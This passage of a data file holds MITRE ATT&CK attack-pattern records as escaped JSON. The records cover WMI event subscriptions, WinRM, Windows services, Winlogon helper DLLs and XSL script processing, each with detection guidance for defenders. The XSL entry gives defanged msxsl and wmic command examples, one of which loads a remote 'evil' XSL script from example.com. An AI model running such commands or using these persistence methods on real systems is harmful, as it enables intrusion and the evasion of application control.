logs\",\"Netflow/Enclave netflow\",\"Process monitoring\",\"Process command-line parameters\"],\"x_mitre_detection\":\"Monitor network traffic for WMI connections; the use of WMI in environments that do not typically use WMI may be suspect. Perform process monitoring to capture command-line arguments of \\\"wmic\\\" and detect commands that are used to perform remote behavior. (Citation: FireEye WMI 2015)\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"User\",\"Administrator\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_remote_support\":true,\"x_mitre_system_requirements\":[\"WMI service, winmgmt, running.\\nHost/network firewalls allowing SMB and WMI ports from source to destination.\\nSMB authentication.\"],\"x_mitre_version\":\"1.1\"}",
    "{\"created\":\"2017-05-31T21:31:05.140Z\",\"external_references\":[{\"external_id\":\"T1084\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1084\"},{\"description\":\"Dell SecureWorks Counter Threat Unit™ (CTU) Research Team. (2016, March 28). A Novel WMI Persistence Implementation. Retrieved March 30, 2016.\",\"source_name\":\"Dell WMI Persistence\",\"url\":\"https://www.secureworks.com/blog/wmi-persistence\"},{\"description\":\"Kazanciyan, R. & Hastings, M. (2014). Defcon 22 Presentation. Investigating PowerShell Attacks &#91;slides&#93;. Retrieved November 3, 2014.\",\"source_name\":\"Kazanciyan 2014\",\"url\":\"https://www.defcon.org/images/defcon-22/dc-22-presentations/Kazanciyan-Hastings/DEFCON-22-Ryan-Kazanciyan-Matt-Hastings-Investigating-Powershell-Attacks.pdf\"},{\"description\":\"Mandiant. (2015, February 24). M-Trends 2015: A View from the Front Lines. Retrieved May 18, 2016.\",\"source_name\":\"Mandiant M-Trends 2015\",\"url\":\"https://www2.fireeye.com/rs/fireye/images/rpt-m-trends-2015.pdf\"},{\"description\":\"Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.\",\"source_name\":\"TechNet Autoruns\",\"url\":\"https://technet.microsoft.com/en-us/sysinternals/bb963902\"},{\"description\":\"French, D. (2018, October 9). Detecting & Removing an Attacker’s WMI Persistence. Retrieved October 11, 2019.\",\"source_name\":\"Medium Detecting WMI Persistence\",\"url\":\"https://medium.com/threatpunter/detecting-removing-wmi-persistence-60ccbb7dff96\"}],\"id\":\"attack-pattern--e906ae4d-1d3a-4675-be23-22f7311c0da4\",\"modified\":\"2020-01-24T14:08:23.156Z\",\"name\":\"Windows Management Instrumentation Event Subscription\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-01-24T14:07:56.276Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may establish persistence and elevate privileges by executing malicious content triggered by a Windows Management Instrumentation (WMI) event subscription. WMI can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Examples of events that may be subscribed to are the wall clock time, user loging, or the computer\'s uptime. (Citation: Mandiant M-Trends 2015)\\n\\nAdversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system. (Citation: FireEye WMI SANS 2015) (Citation: FireEye WMI 2015) Adversaries may also compile WMI scripts into Windows Management Object (MOF) files (.mof extension) that can be used to create a malicious subscription. (Citation: Dell WMI Persistence) (Citation: Microsoft MOF May 2018)\\n\\nWMI subscription execution is proxied by the WMI Provider Host process (WmiPrvSe.exe) and thus may result in elevated SYSTEM privileges.\",\"external_references\":[{\"external_id\":\"T1546.003\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1546/003\"},{\"description\":\"Mandiant. (2015, February 24). M-Trends 2015: A View from the Front Lines. Retrieved May 18, 2016.\",\"source_name\":\"Mandiant M-Trends 2015\",\"url\":\"https://www2.fireeye.com/rs/fireye/images/rpt-m-trends-2015.pdf\"},{\"description\":\"Devon Kerr. (2015). There\'s Something About WMI. Retrieved May 4, 2020.\",\"source_name\":\"FireEye WMI SANS 2015\",\"url\":\"https://www.fireeye.com/content/dam/fireeye-www/services/pdfs/sans-dfir-2015.pdf\"},{\"description\":\"Ballenthin, W., et al. (2015). Windows Management Instrumentation (WMI) Offense, Defense, and Forensics. Retrieved March 30, 2016.\",\"source_name\":\"FireEye WMI 2015\",\"url\":\"https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf\"},{\"description\":\"Dell SecureWorks Counter Threat Unit™ (CTU) Research Team. (2016, March 28). A Novel WMI Persistence Implementation. Retrieved March 30, 2016.\",\"source_name\":\"Dell WMI Persistence\",\"url\":\"https://www.secureworks.com/blog/wmi-persistence\"},{\"description\":\"Satran, M. (2018, May 30). Managed Object Format (MOF). Retrieved January 24, 2020.\",\"source_name\":\"Microsoft MOF May 2018\",\"url\":\"https://docs.microsoft.com/en-us/windows/win32/wmisdk/managed-object-format--mof-\"},{\"description\":\"Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.\",\"source_name\":\"TechNet Autoruns\",\"url\":\"https://technet.microsoft.com/en-us/sysinternals/bb963902\"},{\"description\":\"French, D. (2018, October 9). Detecting & Removing an Attacker’s WMI Persistence. Retrieved October 11, 2019.\",\"source_name\":\"Medium Detecting WMI Persistence\",\"url\":\"https://medium.com/threatpunter/detecting-removing-wmi-persistence-60ccbb7dff96\"},{\"description\":\"Microsoft. (n.d.). Retrieved January 24, 2020.\",\"source_name\":\"Microsoft Register-WmiEvent\",\"url\":\"https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/register-wmievent?view=powershell-5.1\"}],\"id\":\"attack-pattern--910906dd-8c0a-475a-9cc1-5e029e2fad58\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"}],\"modified\":\"2020-05-05T12:02:45.522Z\",\"name\":\"Windows Management Instrumentation Event Subscription\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Process command-line parameters\",\"Process monitoring\",\"WMI Objects\"],\"x_mitre_detection\":\"Monitor WMI event subscription entries, comparing current WMI event subscriptions to known good subscriptions for each host. Tools such as Sysinternals Autoruns may also be used to detect WMI changes that could be attempts at persistence. (Citation: TechNet Autoruns) (Citation: Medium Detecting WMI Persistence)\\n\\nMonitor processes and command-line arguments that can be used to register WMI persistence, such as the <code> Register-WmiEvent</code> [PowerShell](https://attack.mitre.org/techniques/T1086) cmdlet (Citation: Microsoft Register-WmiEvent), as well as those that result from the execution of subscriptions (i.e. spawning from the WmiPrvSe.exe WMI Provider Host process).\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"Administrator\",\"SYSTEM\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:30:33.723Z\",\"external_references\":[{\"external_id\":\"T1028\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1028\"},{\"external_id\":\"CAPEC-555\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/555.html\"},{\"description\":\"Microsoft. (n.d.). Windows Remote Management. Retrieved November 12, 2014.\",\"source_name\":\"Microsoft WinRM\",\"url\":\"http://msdn.microsoft.com/en-us/library/aa384426\"},{\"description\":\"Jacobsen, K. (2014, May 16). Lateral Movement with PowerShell&#91;slides&#93;. Retrieved November 12, 2014.\",\"source_name\":\"Jacobsen 2014\",\"url\":\"https://www.slideshare.net/kieranjacobsen/lateral-movement-with-power-shell-2\"},{\"description\":\"French, D. (2018, September 30). Detecting Lateral Movement Using Sysmon and Splunk. Retrieved October 11, 2019.\",\"source_name\":\"Medium Detecting Lateral Movement\",\"url\":\"https://medium.com/threatpunter/detecting-lateral-movement-using-sysmon-and-splunk-318d3be141bc\"}],\"id\":\"attack-pattern--c3bce4f4-9795-46c6-976e-8676300bbc39\",\"modified\":\"2020-02-11T18:30:20.937Z\",\"name\":\"Windows Remote Management\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-02-11T18:29:47.757Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to interact with remote systems using Windows Remote Management (WinRM). The adversary may then perform actions as the logged-on user.\\n\\nWinRM is the name of both a Windows service and a protocol that allows a user to interact with a remote system (e.g., run an executable, modify the Registry, modify services).(Citation: Microsoft WinRM) It may be called with the `winrm` command or by any number of programs such as PowerShell.(Citation: Jacobsen 2014)\",\"external_references\":[{\"external_id\":\"T1021.006\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1021/006\"},{\"description\":\"Microsoft. (n.d.). Windows Remote Management. Retrieved November 12, 2014.\",\"source_name\":\"Microsoft WinRM\",\"url\":\"http://msdn.microsoft.com/en-us/library/aa384426\"},{\"description\":\"Jacobsen, K. (2014, May 16). Lateral Movement with PowerShell&#91;slides&#93;. Retrieved November 12, 2014.\",\"source_name\":\"Jacobsen 2014\",\"url\":\"https://www.slideshare.net/kieranjacobsen/lateral-movement-with-power-shell-2\"},{\"description\":\"French, D. (2018, September 30). Detecting Lateral Movement Using Sysmon and Splunk. Retrieved October 11, 2019.\",\"source_name\":\"Medium Detecting Lateral Movement\",\"url\":\"https://medium.com/threatpunter/detecting-lateral-movement-using-sysmon-and-splunk-318d3be141bc\"}],\"id\":\"attack-pattern--60d0c01d-e2bf-49dd-a453-f8a9c9fa6f65\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"lateral-movement\"}],\"modified\":\"2020-03-25T12:25:03.014Z\",\"name\":\"Windows Remote Management\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Process command-line parameters\",\"Process monitoring\",\"Netflow/Enclave netflow\",\"Authentication logs\",\"File monitoring\"],\"x_mitre_detection\":\"Monitor use of WinRM within an environment by tracking service execution. If it is not normally used or is disabled, then this may be an indicator of suspicious behavior. Monitor processes created and actions taken by the WinRM process or a WinRM invoked script to correlate it with other related events.(Citation: Medium Detecting Lateral Movement)\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\",\"Administrator\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-01-17T19:13:50.402Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.(Citation: TechNet Services) Windows service configuration information, including the file path to the service\'s executable or recovery programs/commands, is stored in the Windows Registry. Service configurations can be modified using utilities such as sc.exe and [Reg](https://attack.mitre.org/software/S0075). \\n\\nAdversaries may install a new service or modify an existing service by using system utilities to interact with services, by directly modifying the Registry, or by using custom tools to interact with the Windows API. Adversaries may configure services to execute at startup in order to persist on a system.\\n\\nAn adversary may also incorporate [Masquerading](https://attack.mitre.org/techniques/T1036) by using a service name from a related operating system or benign software, or by modifying existing services to make detection analysis more challenging. Modifying existing services may interrupt their functionality or may enable services that are disabled or otherwise not commonly used. \\n\\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges from administrator to SYSTEM. Adversaries may also directly start services through [Service Execution](https://attack.mitre.org/techniques/T1569/002). \",\"external_references\":[{\"external_id\":\"T1543.003\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1543/003\"},{\"description\":\"Microsoft. (n.d.). Services. Retrieved June 7, 2016.\",\"source_name\":\"TechNet Services\",\"url\":\"https://technet.microsoft.com/en-us/library/cc772408.aspx\"},{\"description\":\"Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.\",\"source_name\":\"TechNet Autoruns\",\"url\":\"https://technet.microsoft.com/en-us/sysinternals/bb963902\"},{\"description\":\"Miroshnikov, A. & Hall, J. (2017, April 18). 4697(S): A service was installed in the system. Retrieved August 7, 2018.\",\"source_name\":\"Microsoft 4697 APR 2017\",\"url\":\"https://docs.microsoft.com/windows/security/threat-protection/auditing/event-4697\"},{\"description\":\"Hardy, T. & Hall, J. (2018, February 15). Use Windows Event Forwarding to help with intrusion detection. Retrieved August 7, 2018.\",\"source_name\":\"Microsoft Windows Event Forwarding FEB 2018\",\"url\":\"https://docs.microsoft.com/windows/security/threat-protection/use-windows-event-forwarding-to-assist-in-intrusion-detection\"}],\"id\":\"attack-pattern--2959d63f-73fd-46a1-abd2-109d7dcede32\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"}],\"modified\":\"2020-03-25T22:22:10.041Z\",\"name\":\"Windows Service\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Matthew Demaske, Adaptforward\",\"Travis Smith, Tripwire\",\"Pedro Harrison\"],\"x_mitre_data_sources\":[\"API monitoring\",\"Windows event logs\",\"Process command-line parameters\",\"Process monitoring\",\"File monitoring\",\"Windows Registry\"],\"x_mitre_detection\":\"Monitor processes and command-line arguments for actions that could create or modify services. Command-line invocation of tools capable of adding or modifying services may be unusual, depending on how systems are typically used in a particular environment. Services may also be modified through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001), so additional logging may need to be configured to gather the appropriate data. Remote access tools with built-in features may also interact directly with the Windows API to perform these functions outside of typical system utilities. Collect service utility execution and service binary path arguments used for analysis. Service binary paths may even be changed to execute commands or scripts.  \\n\\nLook for changes to service Registry entries that do not correlate with known software, patch cycles, etc. Service information is stored in the Registry at <code>HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services</code>. Changes to the binary path and the service startup type changed from manual or disabled to automatic, if it does not typically do so, may be suspicious. Tools such as Sysinternals Autoruns may also be used to detect system service changes that could be attempts at persistence.(Citation: TechNet Autoruns)  \\n\\nCreation of new services may generate an alterable event (ex: Event ID 4697 and/or 7045 (Citation: Microsoft 4697 APR 2017)(Citation: Microsoft Windows Event Forwarding FEB 2018)). New, benign services may be created during installation of new software.\\n\\nSuspicious program execution through services may show up as outlier processes that have not been seen before when compared against historical data. Look for abnormal process call trees from known services and for execution of other commands that could relate to Discovery or other adversary techniques. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.\",\"x_mitre_effective_permissions\":[\"Administrator\",\"SYSTEM\"],\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:30:20.148Z\",\"external_references\":[{\"external_id\":\"T1004\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1004\"},{\"external_id\":\"CAPEC-579\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/579.html\"},{\"description\":\"Langendorf, S. (2013, September 24). Windows Registry Persistence, Part 2: The Run Keys and Search-Order. Retrieved April 11, 2018.\",\"source_name\":\"Cylance Reg Persistence Sept 2013\",\"url\":\"https://blog.cylance.com/windows-registry-persistence-part-2-the-run-keys-and-search-order\"},{\"description\":\"Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.\",\"source_name\":\"TechNet Autoruns\",\"url\":\"https://technet.microsoft.com/en-us/sysinternals/bb963902\"}],\"id\":\"attack-pattern--514ede4c-78b3-4d78-a38b-daddf6217a79\",\"modified\":\"2020-01-24T17:07:19.762Z\",\"name\":\"Winlogon Helper DLL\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-01-24T16:59:59.688Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may abuse features of Winlogon to execute DLLs and/or executables when a user logs in. Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete. Registry entries in <code>HKLM\\\\Software[\\\\\\\\Wow6432Node\\\\\\\\]\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\\</code> and <code>HKCU\\\\Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\\</code> are used to manage additional helper programs and functionalities that support Winlogon. (Citation: Cylance Reg Persistence Sept 2013) \\n\\nMalicious modifications to these Registry keys may cause Winlogon to load and execute malicious DLLs and/or executables. Specifically, the following subkeys have been known to be possibly vulnerable to abuse: (Citation: Cylance Reg Persistence Sept 2013)\\n\\n* Winlogon\\\\Notify - points to notification package DLLs that handle Winlogon events\\n* Winlogon\\\\Userinit - points to userinit.exe, the user initialization program executed when a user logs on\\n* Winlogon\\\\Shell - points to explorer.exe, the system shell executed when a user logs on\\n\\nAdversaries may take advantage of these features to repeatedly execute malicious code and establish persistence.\",\"external_references\":[{\"external_id\":\"T1547.004\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1547/004\"},{\"external_id\":\"CAPEC-579\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/579.html\"},{\"description\":\"Langendorf, S. (2013, September 24). Windows Registry Persistence, Part 2: The Run Keys and Search-Order. Retrieved April 11, 2018.\",\"source_name\":\"Cylance Reg Persistence Sept 2013\",\"url\":\"https://blog.cylance.com/windows-registry-persistence-part-2-the-run-keys-and-search-order\"},{\"description\":\"Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.\",\"source_name\":\"TechNet Autoruns\",\"url\":\"https://technet.microsoft.com/en-us/sysinternals/bb963902\"}],\"id\":\"attack-pattern--6836813e-8ec8-4375-b459-abb388cb1a35\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"}],\"modified\":\"2020-04-21T16:00:41.277Z\",\"name\":\"Winlogon Helper DLL\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Praetorian\"],\"x_mitre_data_sources\":[\"Windows Registry\",\"File monitoring\",\"Process monitoring\"],\"x_mitre_detection\":\"Monitor for changes to Registry entries associated with Winlogon that do not correlate with known software, patch cycles, etc. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current Winlogon helper values. (Citation: TechNet Autoruns)  New DLLs written to System32 that do not correlate with known good software or patching may also be suspicious.\\n\\nLook for abnormal process behavior that may be due to a process loading a malicious DLL. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"SYSTEM\",\"Administrator\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2018-10-17T00:14:20.652Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files. Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages. (Citation: Microsoft XSLT Script Mar 2017)\\n\\nAdversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control. Similar to [Trusted Developer Utilities Proxy Execution](https://attack.mitre.org/techniques/T1127), the Microsoft common line transformation utility binary (msxsl.exe) (Citation: Microsoft msxsl.exe) can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files. (Citation: Penetration Testing Lab MSXSL July 2017) Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files. (Citation: Reaqta MSXSL Spearphishing MAR 2018) Msxsl.exe takes two main arguments, an XML source file and an XSL stylesheet. Since the XSL file is valid XML, the adversary may call the same XSL file twice. When using msxsl.exe adversaries may also give the XML/XSL files an arbitrary file extension.(Citation: XSL Bypass Mar 2019)\\n\\nCommand-line examples:(Citation: Penetration Testing Lab MSXSL July 2017)(Citation: XSL Bypass Mar 2019)\\n\\n* <code>msxsl.exe customers[.]xml script[.]xsl</code>\\n* <code>msxsl.exe script[.]xsl script[.]xsl</code>\\n* <code>msxsl.exe script[.]jpeg script[.]jpeg</code>\\n\\nAnother variation of this technique, dubbed “Squiblytwo”, involves using [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) to invoke JScript or VBScript within an XSL file.(Citation: LOLBAS Wmic) This technique can also execute local/remote scripts and, similar to its [Regsvr32](https://attack.mitre.org/techniques/T1117)/ \\\"Squiblydoo\\\" counterpart, leverages a trusted, built-in Windows tool. Adversaries may abuse any alias in [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) provided they utilize the /FORMAT switch.(Citation: XSL Bypass Mar 2019)\\n\\nCommand-line examples:(Citation: XSL Bypass Mar 2019)(Citation: LOLBAS Wmic)\\n\\n* Local File: <code>wmic process list /FORMAT:evil[.]xsl</code>\\n* Remote File: <code>wmic os get /FORMAT:”https[:]//example[.]com/evil[.]xsl”</code>\",\"external_references\":[{\"external_id\":\"T1220\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1220\"},{\"description\":\"Wenzel, M. et al. (2017, March 30). XSLT Stylesheet Scripting Using <msxsl:script>. Retrieved July 3, 2018.\",\"source_name\":\"Microsoft XSLT Script Mar 2017\",\"url\":\"https://docs.microsoft.com/dotnet/standard/data/xml/xslt-stylesheet-scripting-using-msxsl-script\"},{\"description\":\"Microsoft. (n.d.). Command Line Transformation Utility (msxsl.exe). Retrieved July 3, 2018.\",\"source_name\":\"Microsoft msxsl.exe\",\"url\":\"https://www.microsoft.com/download/details.aspx?id=21714\"},{\"description\":\"netbiosX. (2017, July 6). AppLocker Bypass – MSXSL. Retrieved July 3, 2018.\",\"source_name\":\"Penetration Testing Lab MSXSL July 2017\",\"url\":\"https://pentestlab.blog/2017/07/06/applocker-bypass-msxsl/\"},{\"description\":\"Admin. (2018, March 2). Spear-phishing campaign leveraging on MSXSL. Retrieved July 3, 2018.\",\"source_name\":\"Reaqta MSXSL Spearphishing MAR 2018\",\"url\":\"https://reaqta.com/2018/03/spear-phishing-campaign-leveraging-msxsl/\"},{\"description\":\"Singh, A. (2019, March 14). MSXSL.EXE and WMIC.EXE — A Way to Proxy Code Execution. Retrieved August 2, 2019.\",\"source_name\":\"XSL Bypass Mar 2019\",\"url\":\"https://medium.com/@threathuntingteam/msxsl-exe-and-wmic-exe-a-way-to-proxy-code-execution-8d524f642b75\"},{\"description\":\"LOLBAS. (n.d.). Wmic.exe. Retrieved July 31, 2019.\",\"source_name\":\"LOLBAS Wmic\",\"url\":\"https://lolbas-project.github.io/lolbas/Binaries/Wmic/\"},{\"description\":\"Desimone, J. (2018, April 18). Status Update. Retrieved July 3, 2018.\",\"source_name\":\"Twitter SquiblyTwo Detection APR 2018\",\"url\":\"https://twitter.com/dez_/status/986614411711442944\"}],\"id\":\"attack-pattern--ebbe170d-aa74-4946-8511-9921243415a3\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-06-20T22:45:46.479Z\",\"name\":\"XSL Script Processing\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Avneet Singh\",\"Casey Smith\",\"Praetorian\"],\"x_mitre_data_sources\":[\"Process monitoring\",\"Process command-line parameters\",\"Process use of network\",\"DLL monitoring\"],\"x_mitre_defense_bypassed\":[\"Anti-virus\",\"Application control\",\"Digital Certificate Validation\"],\"x_mitre_detection\":\"Use process monitoring to monitor the execution and arguments of msxsl.exe and wmic.exe. Compare recent invocations of these utilities with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity (ex: URL command line arguments, creation of external network connections, loading of DLLs associated with scripting). (Citation: LOLBAS Wmic) (Citation: Twitter SquiblyTwo Detection APR 2018) Command arguments used before and after the script invocation may also be useful in determining the origin and purpose of the payload being loaded.\\n\\nThe presence of msxsl.exe or other utilities that enable proxy execution that are typically used for development, debugging, and reverse engineering on a system that is not used for these purposes may be suspicious.\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_system_requirements\":[\"Microsoft Core XML Services (MSXML) or access to wmic.exe\"],\"x_mitre_version\":\"1.2\"}",
]
